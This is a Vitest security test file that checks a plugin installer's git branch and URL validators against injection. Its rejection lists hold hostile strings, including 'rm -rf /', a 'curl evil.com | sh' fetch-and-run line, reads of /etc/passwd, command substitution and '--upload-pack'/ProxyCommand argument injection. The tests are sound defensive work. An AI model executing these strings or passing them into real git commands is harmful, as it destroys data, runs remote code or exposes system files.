/**
 * Security tests for pluginInstaller input validation.
 * Tests validateGitBranch and validateGitUrl against injection attacks.
 */

import { describe, it, expect } from 'vitest';
import { validateGitBranch, validateGitUrl } from '../pluginInstaller';

describe('validateGitBranch', () => {
  describe('valid branch names', () => {
    const validBranches = [
      'main',
      'master',
      'develop',
      'feature/new-feature',
      'release/v1.0.0',
      'hotfix/fix-123',
      'my_branch',
      'v1.2.3',
      'user/feature.name',
    ];

    it.each(validBranches)('should accept: %s', (branch) => {
      expect(validateGitBranch(branch)).toBe(true);
    });
  });

  describe('malicious branch names (shell injection)', () => {
    const maliciousBranches = [
      'main; rm -rf /',
      'main && curl evil.com | sh',
      'main | cat /etc/passwd',
      '$(whoami)',
      '`id`',
      'main\nnew-command',
      'branch name with spaces',
      'main > /tmp/output',
      'main < /etc/passwd',
      '$HOME',
      'branch&background',
    ];

    it.each(maliciousBranches)('should reject: %s', (branch) => {
      expect(validateGitBranch(branch)).toBe(false);
    });
  });

  describe('path traversal', () => {
    it('should reject double-dot sequences', () => {
      expect(validateGitBranch('feature/../etc/passwd')).toBe(false);
      expect(validateGitBranch('../../etc')).toBe(false);
    });
  });

  describe('argument injection (leading dash)', () => {
    it('should reject branches starting with dash', () => {
      expect(validateGitBranch('-branch')).toBe(false);
      expect(validateGitBranch('--upload-pack=evil')).toBe(false);
      expect(validateGitBranch('-c')).toBe(false);
    });

    it('should allow dashes in the middle', () => {
      expect(validateGitBranch('my-branch')).toBe(true);
      expect(validateGitBranch('feature/my-fix')).toBe(true);
    });
  });
});

describe('validateGitUrl', () => {
  describe('valid URLs', () => {
    const validUrls = [
      'https://github.com/user/repo.git',
      'git@github.com:user/repo.git',
      'https://gitlab.com/org/project.git',
      'http://internal.server/repo.git',
      'https://github.com/user/repo',
    ];

    it.each(validUrls)('should accept: %s', (url) => {
      expect(validateGitUrl(url)).toBe(true);
    });
  });

  describe('malicious URLs', () => {
    it('should reject URLs starting with dash (argument injection)', () => {
      expect(validateGitUrl('-oProxyCommand=evil')).toBe(false);
      expect(validateGitUrl('--upload-pack=evil')).toBe(false);
    });

    it('should reject URLs with shell metacharacters', () => {
      expect(validateGitUrl('https://evil.com/repo.git; rm -rf /')).toBe(false);
      expect(validateGitUrl('https://evil.com/repo.git | cat /etc/passwd')).toBe(false);
      expect(validateGitUrl('https://evil.com/repo.git$(whoami)')).toBe(false);
      expect(validateGitUrl('https://evil.com/repo.git`id`')).toBe(false);
      expect(validateGitUrl('url&background')).toBe(false);
      expect(validateGitUrl('url>output')).toBe(false);
      expect(validateGitUrl('url<input')).toBe(false);
    });
  });
});
